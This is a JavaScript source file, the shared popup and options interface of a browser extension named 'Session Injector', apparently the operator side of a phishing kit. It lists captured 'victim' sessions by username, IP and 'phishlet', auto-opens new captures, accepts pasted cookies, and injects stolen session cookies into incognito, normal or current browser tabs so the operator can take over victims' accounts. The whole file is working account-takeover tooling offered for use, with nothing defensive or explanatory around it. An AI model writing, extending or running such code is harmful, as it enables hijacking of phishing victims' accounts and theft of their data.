/* Session Injector - shared UI logic for popup + options. */
'use strict';

var SI = (function () {
  var ICO = {
    ext: '<path d="M14 4h6v6"/><path d="M20 4l-9 9"/><path d="M18 14v5a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V7a1 1 0 0 1 1-1h5"/>',
    win: '<rect x="3" y="4" width="18" height="14" rx="1.6"/><path d="M8 21h8"/>',
    tab: '<rect x="3" y="6" width="18" height="12" rx="1.6"/><path d="M3 10h18"/>',
    ghost: '<path d="M12 3a7 7 0 0 0-7 7v7l2-1.5L9 17l3-1.5L15 17l2-1.5L19 17v-7a7 7 0 0 0-7-7z"/><path d="M10 9.5h.01M14 9.5h.01"/>',
    trash: '<path d="M4 7h16M9 7V5h6v2M6 7l1 13h10l1-13"/>',
    dash: '<rect x="3" y="4" width="18" height="16" rx="1.6"/><path d="M3 9h18M8 14h8"/>',
    chev: '<path d="M9 6l6 6-6 6"/>',
    shield: '<path d="M12 3l7 3v5.2c0 4.3-2.9 8.1-7 9.3-4.1-1.2-7-5-7-9.3V6z"/>',
    paste: '<path d="M9 4h6v3H9z"/><path d="M15 5.5h2A1.5 1.5 0 0 1 18.5 7v12A1.5 1.5 0 0 1 17 20.5H7A1.5 1.5 0 0 1 5.5 19V7A1.5 1.5 0 0 1 7 5.5h2"/>',
    edit: '<path d="M4 20h4l10-10-4-4L4 16z"/><path d="M13.5 6.5l4 4"/>'
  };
  function ico(n) { return ICO[n] ? '<svg class="ic" viewBox="0 0 24 24">' + ICO[n] + '</svg>' : ''; }
  function esc(v) {
    if (v === null || v === undefined) return '';
    return String(v).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }
  function send(msg) {
    return new Promise(function (res) {
      try { chrome.runtime.sendMessage(msg, function (r) { res(r || {}); }); }
      catch (e) { res({ error: String(e.message || e) }); }
    });
  }
  function fmt(ts) {
    if (!ts) return '';
    var d = Date.now() - ts;
    if (d < 60000) return Math.max(1, Math.round(d / 1000)) + 's ago';
    if (d < 3600000) return Math.round(d / 60000) + 'm ago';
    if (d < 86400000) return Math.round(d / 3600000) + 'h ago';
    return new Date(ts).toLocaleDateString();
  }
  function toast(msg, kind) {
    var el = document.getElementById('toast');
    if (!el) return;
    el.className = 'toast ' + (kind || 'info');
    el.textContent = msg;
    el.style.display = 'block';
    clearTimeout(el._t);
    el._t = setTimeout(function () { el.style.display = 'none'; }, 3200);
  }

  var state = null;
  var wide = false;

  function victim(e) {
    return (e && (e.username || e.phishlet)) ? (e.username || '(' + e.phishlet + ')') : 'unknown';
  }

  function sessionItem(e) {
    return '<div class="item" data-act="open-recent" data-id="' + esc(e.id) + '">' +
      ico('shield') +
      '<span class="meta"><span class="t1">' + esc(victim(e)) + '</span>' +
      '<span class="t2">#' + esc(e.id) + ' ' + esc(e.phishlet || '') + (e.ip ? ' ' + esc(e.ip) : '') + ' ' + fmt(e.at) + '</span></span>' +
      '<span class="badge mut">' + (e.count || 0) + ' ck</span>' +
      '<span class="go">' + ico('chev') + '</span></div>';
  }

  function modeBtns(id, cur) {
    function b(mode, label, icon, primary) {
      return '<button class="btn' + (primary ? ' primary' : '') + '" data-act="open-mode" data-id="' + esc(id) + '" data-mode="' + mode + '">' +
        ico(icon) + ' ' + label + '</button>';
    }
    return '<div class="grid3">' +
      b('incognito', 'Incognito', 'ghost', cur === 'incognito') +
      b('normal', 'Normal', 'win', cur === 'normal') +
      b('here', 'This tab', 'tab', cur === 'here') +
      '</div>';
  }

  function render() {
    var st = state || {};
    var set = st.settings || {};
    var recent = st.recent || [];
    var cur = st.current || null;
    var wins = st.windows || [];

    var h = '';
    if (st.error) h += '<div class="sec"><div class="note warn">' + esc(st.error) + '</div></div>';

    h += '<div class="sec"><div class="lbl">Status</div><div class="card">' +
      '<div class="row" style="margin-bottom:6px"><span class="dot ' + (st.connected ? 'on' : '') + '"></span>' +
      '<span>' + (st.connected ? 'Dashboard connected' : 'No dashboard tab open') + '</span></div>';
    if (!wins.length) {
      h += '<div class="row"><span class="dot"></span><span class="muted">No takeover window open</span></div>';
    } else {
      wins.forEach(function (w) {
        h += '<div class="row" style="margin-top:4px"><span class="dot ' + (w.actual === 'incognito' ? 'on' : 'warn') + '"></span>' +
          '<span class="muted">' + (w.kind === 'incognito' ? 'Incognito' : 'Normal') + ' window' +
          (w.actual !== w.kind ? ' (incognito unavailable)' : '') + '</span>' +
          '<button class="btn sm" data-act="focus" data-id="' + w.id + '">Focus</button></div>';
      });
    }
    h += '</div></div>';

    if (cur) {
      h += '<div class="sec"><div class="lbl">Selected session</div><div class="card">' +
        '<div class="kv"><span class="k">Session</span><span class="v">#' + esc(cur.sessionId) + '</span>' +
        '<span class="k">Phishlet</span><span class="v">' + esc(cur.phishlet || '-') + '</span>' +
        '<span class="k">Cookies</span><span class="v">' + (cur.hasTokens ? 'captured' : 'none') + '</span></div>' +
        '<div class="hint dim" style="margin:8px 0 6px">Open in:</div>' +
        modeBtns(cur.sessionId, set.mode) +
        '</div></div>';
    }

    if (st.active) {
      h += '<div class="sec"><div class="lbl">Live: ' + esc(st.active.name || victim(st.active)) + '</div><div class="card">' +
        '<div class="kv"><span class="k">Victim</span><span class="v">' + esc(victim(st.active)) + '</span>' +
        '<span class="k">Session</span><span class="v">#' + esc(st.active.id) + '</span>' +
        '<span class="k">Where</span><span class="v">' + esc(st.active.where || '-') + '</span>' +
        '<span class="k">Since</span><span class="v">' + fmt(st.active.at) + '</span></div>' +
        '<div class="field" style="margin-top:8px"><label class="dim" style="font-size:10.5px">Window name</label>' +
        '<div class="row"><input type="text" id="rename" value="' + esc(st.active.name || '') + '" placeholder="e.g. alice">' +
        '<button class="btn sm" data-act="rename">Set</button></div></div>' +
        '<div class="grid2" style="margin-top:6px">' +
        '<button class="btn" data-act="focus-live">' + ico('win') + ' Focus</button>' +
        '<button class="btn danger" data-act="clear">' + ico('trash') + ' Clear cookies</button>' +
        '</div></div></div>';
    }

    h += '<div class="sec"><div class="lbl">Recent sessions' +
      (recent.length > 4 && !wide ? '<span class="right"><a data-act="options">all ' + recent.length + '</a></span>' : '') +
      '<span class="right"><a data-act="paste">' + ico('paste') + ' paste cookies</a></span></div>';
    if (!recent.length) {
      h += '<div class="empty">Nothing yet. Take over a session from the dashboard, or paste cookies.</div>';
    } else {
      h += '<div class="list">' + recent.slice(0, wide ? 50 : 4).map(sessionItem).join('') + '</div>';
    }
    h += '</div>';

    h += '<div class="sec"><div class="lbl">Behaviour</div><div class="card">' +
      '<label class="sw mb8" style="padding:2px 0"><input type="checkbox" data-set="autoOpen"' + (set.autoOpen ? ' checked' : '') + '><span class="track"></span>' +
      '<span>Auto-open new captures</span></label>' +
      (set.autoOpen && !set.dashboardUrl ? '<div class="hint dim" style="margin:-2px 0 8px">Needs a dashboard URL and login below.</div>' : '') +
      '<div class="field" style="margin:8px 0 0"><label class="dim" style="font-size:10.5px">Where a takeover opens</label>' +
      '<select data-set="mode">' +
      '<option value="incognito"' + (set.mode === 'incognito' ? ' selected' : '') + '>Incognito window (own cookie jar)</option>' +
      '<option value="normal"' + (set.mode === 'normal' ? ' selected' : '') + '>Normal window (shares your jar)</option>' +
      '<option value="here"' + (set.mode === 'here' ? ' selected' : '') + '>This tab</option>' +
      '</select></div>' +
      '<div class="field" style="margin-top:8px"><label class="dim" style="font-size:10.5px">Window name prefix</label>' +
      '<input type="text" data-set="namePrefix" value="' + esc(set.namePrefix || '') + '" placeholder="optional, e.g. camp-"></div>' +
      '<div class="actions"><button class="btn" data-act="save">Save</button>' +
      '<button class="btn danger" data-act="close-windows">Close windows</button></div>' +
      '</div></div>';

    if (wide) {
      h += '<div class="sec"><div class="lbl">Dashboard link</div><div class="card">' +
        '<div class="field"><label class="dim" style="font-size:10.5px">Base URL</label><input type="text" data-set="dashboardUrl" value="' + esc(set.dashboardUrl || '') + '" placeholder="http://127.0.0.1:5000"></div>' +
        '<div class="grid2"><div class="field"><label class="dim" style="font-size:10.5px">User</label><input type="text" data-set="user" value="' + esc(set.user || '') + '"></div>' +
        '<div class="field"><label class="dim" style="font-size:10.5px">Password</label><input type="password" data-set="pass" value="' + esc(set.pass || '') + '"></div></div>' +
        '<div class="hint dim">Lets the popup take over any session without the dashboard tab open.</div>' +
        '<div class="actions" style="margin-top:9px"><button class="btn" data-act="save">Save</button>' +
        '<button class="btn" data-act="open-dash">' + ico('dash') + ' Open dashboard</button></div></div></div>';
    }

    document.getElementById('main').innerHTML = h;
    var f = document.getElementById('foot');
    if (f) {
      f.innerHTML = '<span class="dim">opens in ' + esc(set.mode === 'incognito' ? 'incognito' : set.mode === 'here' ? 'this tab' : 'a normal window') + '</span>' +
        '<span style="margin-left:auto"></span>' + (wide ? '' : '<a data-act="options">Settings</a>');
    }
  }

  function after(r, verb) {
    if (r.error) { toast(r.error, 'err'); return refresh(); }
    toast((r.success || 0) + ' cookies -> ' + (r.where || '') + (r.failed ? ', ' + r.failed + ' failed' : '') +
      (r.cleared ? ' (' + r.cleared + ' stale cleared)' : ''), r.failed ? 'info' : 'ok');
    return refresh();
  }

  function openById(id, mode) {
    return send({ action: 'injectById', id: id, mode: mode }).then(function (r) { return after(r); });
  }

  function refresh() {
    return Promise.all([
      send({ action: 'state' }),
      chrome.storage.local.get(['dashboardConnected', 'currentSession'])
    ]).then(function (r) {
      var st = r[0] || {};
      var ls = r[1] || {};
      st.connected = !!ls.dashboardConnected;
      st.current = ls.currentSession || null;
      state = st;
      if (!state.settings) state.settings = {};
      render();
    });
  }

  var ACTIONS = {
    'open-mode': function (id, el) {
      return openById(id, el.getAttribute('data-mode'));
    },
    'open-recent': function (id) {
      var e = (state.recent || []).find(function (x) { return String(x.id) === String(id); });
      if (e && e.cookies && e.cookies.length) {
        return send({
          action: 'inject', mode: state.settings.mode,
          payload: { session_id: e.id, phishlet: e.phishlet, username: e.username, remote_addr: e.ip, target_url: e.target_url, cookies: e.cookies }
        }).then(function (r) { return after(r); });
      }
      return openById(id, state.settings.mode);
    },
    paste: function () {
      chrome.windows.create({ url: chrome.runtime.getURL('paste.html'), type: 'popup', width: 520, height: 660 });
    },
    rename: function () {
      var el = document.getElementById('rename');
      if (!el) return;
      send({ action: 'rename', name: el.value }).then(function (r) { toast(r.error || 'named "' + esc(r.name) + '"', r.error ? 'err' : 'ok'); refresh(); });
    },
    clear: function () { send({ action: 'clearIsolated' }).then(function (r) { toast('cleared ' + (r.cleared || 0) + ' cookies', 'ok'); refresh(); }); },
    'close-windows': function () { send({ action: 'closeWindows' }).then(function (r) { toast('closed ' + (r.closed || 0) + ' window(s)', 'ok'); refresh(); }); },
    focus: function (id) { chrome.windows.update(Number(id), { focused: true }); },
    'focus-live': function () { if (state.active && state.active.winId) chrome.windows.update(state.active.winId, { focused: true }); },
    options: function () { chrome.runtime.openOptionsPage(); },
    'open-dash': function () {
      var u = (state.settings.dashboardUrl || '').replace(/\/+$/, '');
      if (u) chrome.tabs.create({ url: u }); else toast('set a dashboard url first', 'info');
    },
    save: function () {
      var patch = {};
      document.querySelectorAll('[data-set]').forEach(function (el) {
        patch[el.getAttribute('data-set')] = el.type === 'checkbox' ? el.checked : el.value.trim();
      });
      send({ action: 'settings', patch: patch }).then(function () { toast('saved', 'ok'); refresh(); });
    }
  };

  function mount(isWide) {
    wide = !!isWide;
    document.body.className = wide ? 'options' : 'popup';
    document.addEventListener('click', function (e) {
      var el = e.target.closest ? e.target.closest('[data-act]') : null;
      if (!el) return;
      var fn = ACTIONS[el.getAttribute('data-act')];
      if (fn) { e.preventDefault(); fn(el.getAttribute('data-id'), el); }
    });
    document.addEventListener('keydown', function (e) {
      if (e.key === 'Enter' && e.target && e.target.id === 'rename') { e.preventDefault(); ACTIONS.rename(); }
    });
    document.addEventListener('change', function (e) {
      var el = e.target;
      if (!el.hasAttribute || !el.hasAttribute('data-set')) return;
      if (el.type === 'checkbox' || el.tagName === 'SELECT') {
        var patch = {};
        patch[el.getAttribute('data-set')] = el.type === 'checkbox' ? el.checked : el.value;
        send({ action: 'settings', patch: patch }).then(refresh);
      }
    });
    chrome.storage.onChanged.addListener(function (c, area) { if (area === 'local') refresh(); });
    refresh();
  }

  return { mount: mount, refresh: refresh, esc: esc, send: send, toast: toast };
})();
